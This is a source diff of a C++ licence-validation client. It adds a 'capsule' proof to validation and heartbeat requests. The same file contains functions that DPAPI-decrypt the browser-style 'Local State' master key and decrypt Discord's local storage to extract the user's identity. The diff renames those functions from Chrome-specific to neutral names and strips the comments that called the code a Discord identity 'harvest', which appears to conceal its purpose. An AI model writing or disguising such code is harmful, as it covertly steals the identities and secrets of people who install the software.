@@ -23,6 +23,7 @@
 #include "gate_tokens.hpp"
 #include "reason_ids.hpp"
 #include "loader_header_invariant.hpp"
+#include "customer_capsule.hpp"
 #include "hardware_id/hardware_id_v2.hpp"
 #include "plaintext_window.hpp"
 #include "../testlab/test_all_features.hpp"
@@ -4276,9 +4277,8 @@ namespace
         return out;
     }
 
-    // Extract and DPAPI-decrypt the Chrome/Discord AES-256-GCM master key from Local State
-    static bool dpapi_get_chrome_aes_key(const std::filesystem::path& local_state_path,
-                                          std::vector<uint8_t>& out_key)
+    static bool dpapi_get_local_state_aes_key(const std::filesystem::path& local_state_path,
+                                              std::vector<uint8_t>& out_key)
     {
         std::error_code ec;
         auto sz = std::filesystem::file_size(local_state_path, ec);
@@ -4309,11 +4309,9 @@ namespace
         return out_key.size() == 32;
     }
 
-    // Decrypt a Chrome v10/v11 AES-256-GCM blob via OpenSSL
-    // Layout: "v10"|"v11" (3B) + nonce (12B) + ciphertext (nB) + tag (16B)
-    static bool chrome_aes_gcm_decrypt(const std::vector<uint8_t>& key,
-                                        const uint8_t* blob, size_t blob_len,
-                                        std::string& out)
+    static bool local_state_aes_gcm_decrypt(const std::vector<uint8_t>& key,
+                                            const uint8_t* blob, size_t blob_len,
+                                            std::string& out)
     {
         if (blob_len < 31) return false;
         if (blob[0] != 'v' || blob[1] != '1' || (blob[2] != '0' && blob[2] != '1')) return false;
@@ -4341,7 +4339,6 @@ namespace
         return ok;
     }
 
-    // Scan binary data for v10/v11 blobs, decrypt each, search for Discord identity
     static bool scan_dpapi_blobs_for_discord(const std::vector<uint8_t>& aes_key,
                                               const uint8_t* data, size_t data_len,
                                               local_discord_identity_t& out)
@@ -4359,7 +4356,7 @@ namespace
             size_t blob_end = (std::min)(next, i + 4096u);
             if (blob_end - i >= 31) {
                 std::string plain;
-                if (chrome_aes_gcm_decrypt(aes_key, data + i, blob_end - i, plain)) {
+                if (local_state_aes_gcm_decrypt(aes_key, data + i, blob_end - i, plain)) {
                     local_discord_identity_t cand{};
                     if (extract_discord_identity_from_text(plain, cand) && !cand.user_id.empty()) {
                         out = cand; return true;
@@ -4371,12 +4368,11 @@ namespace
         return false;
     }
 
-    // Attempt full DPAPI+AES-GCM Discord identity harvest from one Discord root folder
     static bool harvest_discord_identity_dpapi(const std::filesystem::path& root,
                                                 local_discord_identity_t& out)
     {
         std::vector<uint8_t> aes_key;
-        if (!dpapi_get_chrome_aes_key(root / "Local State", aes_key)) return false;
+        if (!dpapi_get_local_state_aes_key(root / "Local State", aes_key)) return false;
         const auto leveldb = root / "Local Storage" / "leveldb";
         std::error_code ec;
         if (!std::filesystem::exists(leveldb, ec)) {
@@ -4698,6 +4694,60 @@ namespace
         out.id = std::move(cid);
         out.nonce = std::move(cnonce);
         lic_log_fmt("fetch_challenge_ok id_len=%zu nonce_len=%zu", out.id.size(), out.nonce.size());
+        return true;
+    }
+
+    bool attach_standalone_capsule_proof(json& body,
+                                         const std::string& action,
+                                         const std::string& key,
+                                         const std::string& hwid,
+                                         const std::string& session_token,
+                                         const std::string& nonce)
+    {
+        body.erase("standalone_capsule");
+        const auto& info = aida::runtime::customer_capsule::get_capsule_info();
+        aida::runtime::customer_capsule::proof_fields_t proof{};
+        bool ok = false;
+        if (action == "validate")
+        {
+            ok = aida::runtime::customer_capsule::build_validate_proof(key, hwid, nonce, proof);
+        }
+        else if (action == "heartbeat")
+        {
+            std::uint32_t heartbeat_count = 0;
+            if (body.contains("heartbeat_count") && body["heartbeat_count"].is_number_unsigned())
+                heartbeat_count = body["heartbeat_count"].get<std::uint32_t>();
+            else if (body.contains("heartbeat_count") && body["heartbeat_count"].is_number_integer())
+            {
+                const int raw = body["heartbeat_count"].get<int>();
+                heartbeat_count = raw > 0 ? static_cast<std::uint32_t>(raw) : 0u;
+            }
+            const std::string req_seq = body.contains("req_seq") && body["req_seq"].is_string()
+                ? body["req_seq"].get<std::string>()
+                : std::string();
+            ok = aida::runtime::customer_capsule::build_heartbeat_proof(
+                key, session_token, hwid, nonce, heartbeat_count, req_seq, proof);
+        }
+
+        lic_log_fmt("standalone_capsule action=%.16s present=%d valid=%d attached=%d id=%.16s base=%.16s capsule=%.16s err=%.64s",
+            action.c_str(),
+            info.present ? 1 : 0,
+            info.valid ? 1 : 0,
+            ok ? 1 : 0,
+            info.capsule_id.empty() ? "<none>" : info.capsule_id.c_str(),
+            info.base_sha256.empty() ? "<none>" : info.base_sha256.c_str(),
+            info.capsule_sha256.empty() ? "<none>" : info.capsule_sha256.c_str(),
+            info.error.empty() ? "<none>" : info.error.c_str());
+
+        if (!ok) return false;
+        json capsule{};
+        capsule["capsule_id"] = proof.capsule_id;
+        capsule["base_sha256"] = proof.base_sha256;
+        capsule["capsule_sha256"] = proof.capsule_sha256;
+        capsule["proof_nonce"] = proof.proof_nonce;
+        capsule["proof_ts"] = proof.proof_ts;
+        capsule["proof"] = proof.proof;
+        body["standalone_capsule"] = std::move(capsule);
         return true;
     }
 
@@ -5447,6 +5497,7 @@ namespace
                 }
             }
 
+            attach_standalone_capsule_proof(body, action, key, hwid, session_token, nonce);
             std::string body_str = body.dump();
 
             if (call_validation_endpoint_once(action, key, hwid, session_token, nonce,
@@ -5469,6 +5520,7 @@ namespace
                 const uint64_t retry_req_seq = next_replay_req_seq();
                 body["req_ts_ms"] = retry_req_ts_ms;
                 body["req_seq"] = std::to_string(retry_req_seq);
+                attach_standalone_capsule_proof(body, action, key, hwid, session_token, nonce);
                 body_str = body.dump();
                 lic_log_fmt("heartbeat_retry_replay_fields req_seq=%llu req_ts_ms=%lld",
                     static_cast<unsigned long long>(retry_req_seq),
